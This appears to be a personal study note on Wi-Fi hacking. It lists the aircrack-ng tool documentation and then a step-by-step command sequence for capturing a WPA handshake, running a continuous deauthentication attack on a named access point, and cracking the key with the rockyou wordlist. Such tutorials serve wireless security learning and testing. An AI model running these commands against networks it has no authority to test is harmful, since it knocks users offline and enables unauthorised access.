#hacking #wifi
https://www.youtube.com/watch?v=WfYxrLaqlN8

# Main documentation

## Aircrack-ng suite

-   [airbase-ng](https://www.aircrack-ng.org/doku.php?id=airbase-ng "airbase-ng") -- Multi-purpose tool aimed at attacking clients as opposed to the Access Point (AP) itself.
-   [aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng "aircrack-ng") -- 802.11 WEP and WPA/WPA2-PSK key cracking program.
-   [airdecap-ng](https://www.aircrack-ng.org/doku.php?id=airdecap-ng "airdecap-ng") -- Decrypt WEP/WPA/WPA2 capture files.
-   [airdecloak-ng](https://www.aircrack-ng.org/doku.php?id=airdecloak-ng "airdecloak-ng") -- Remove WEP Cloaking™ from a packet capture file.
-   [airdrop-ng](https://www.aircrack-ng.org/doku.php?id=airdrop-ng "airdrop-ng") -- A rule based wireless deauthication tool.
-   [aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng "aireplay-ng") -- Inject and replay wireless frames.
-   [airgraph-ng](https://www.aircrack-ng.org/doku.php?id=airgraph-ng "airgraph-ng") -- Graph wireless networks.
-   [airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng "airmon-ng") -- Enable and disable monitor mode on wireless interfaces.
-   [airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng "airodump-ng") -- Capture raw 802.11 frames.
-   [airolib-ng](https://www.aircrack-ng.org/doku.php?id=airolib-ng "airolib-ng") -- Precompute WPA/WPA2 passphrases in a database to use it later with aircrack-ng.
-   [airserv-ng](https://www.aircrack-ng.org/doku.php?id=airserv-ng "airserv-ng") -- Wireless card TCP/IP server which allows multiple application to use a wireless card.
-   [airtun-ng](https://www.aircrack-ng.org/doku.php?id=airtun-ng "airtun-ng") -- Virtual tunnel interface creator.
-   [packetforge-ng](https://www.aircrack-ng.org/doku.php?id=packetforge-ng "packetforge-ng") -- Create various type of encrypted packets that can be used for injection.

-   [Other tools](https://www.aircrack-ng.org/doku.php?id=tools "Other tools") - WZCook and ivstools

## Aircrack-ng suite (unstable/experimental tools)

-   [easside-ng](https://www.aircrack-ng.org/doku.php?id=easside-ng "easside-ng") -- Auto-magic tool which allows you to communicate to an WEP-encrypted Access Point without knowing the key.
-   [tkiptun-ng](https://www.aircrack-ng.org/doku.php?id=tkiptun-ng "tkiptun-ng") -- Proof-of-concept implementation the WPA/TKIP attack: inject a few frames into a WPA TKIP network with QoS
-   [wesside-ng](https://www.aircrack-ng.org/doku.php?id=wesside-ng "wesside-ng") -- Auto-magic tool which incorporates a number of techniques to seamlessly obtain a WEP key in minutes.

## Other Documentation

-   [Compatibility, Drivers, Which Card to Purchase](https://www.aircrack-ng.org/doku.php?id=compatibility_drivers "Compatibility, Drivers, Which Card to Purchase")
-   Installing the [aircrack-ng suite](https://www.aircrack-ng.org/doku.php?id=install_aircrack "Install Aircrack-ng suite") and the [drivers](https://www.aircrack-ng.org/doku.php?id=install_drivers "Install drivers")
-   [Tutorials](https://www.aircrack-ng.org/doku.php?id=tutorial "Tutorials")
-   [FAQ](https://www.aircrack-ng.org/doku.php?id=faq "FAQ and Troubleshooting") - Frequently Asked Questions and Troubleshooting
-   [Videos](https://www.aircrack-ng.org/doku.php?id=videos "Videos")
-   [User Documentation by Platform (Linux, Windows)](https://www.aircrack-ng.org/doku.php?id=user_docs "User Documentation by Platform (Linux, Windows)")
-   [Links, References and Other Learning Materials](https://www.aircrack-ng.org/doku.php?id=links "Links, References and Other Learning Materials")


# Commands used:

**See version of Kali**
cat /etc/os-release
uname -a

**See interfaces**
ip addr
iwconfig

**kill processes**
sudo airmon-ng check kill

**Start monitor mode**
sudo airmon-ng start wlan0

**Verify that monitor mode is used**
sudo airmon-ng 

**You could also use iwconfig to check that interface is in monitor mode:**
iwconfig

**Get the AP's MAC address and channel**
sudo airodump-ng wlan0mon

**AP-MAC & channel - you need to select your own here:**
ESSID: 90:9A:4A:B8:F3:FB
Channel used by AP for SSID: 2

**1st Window:**
!Make sure you replace the channel number and bssid with your own
!Replace hack1 with your file name like capture1 or something 
sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon

**2nd Window - deauth attack**
!Make sure you replace the bssid with your own
sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon

**Use Wireshark to open hack file**
wireshark hack1-01.cap
!Filter Wireshark messages for EAPOL
eapol

**Stop monitor mode**
airmon-ng stop wlan0mon

**Crack file with Rock you or another wordlist
Make sure you have rockyou in text format (unzip file on Kali)**
**Replace hack1-01.cap with your file name**
aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt 

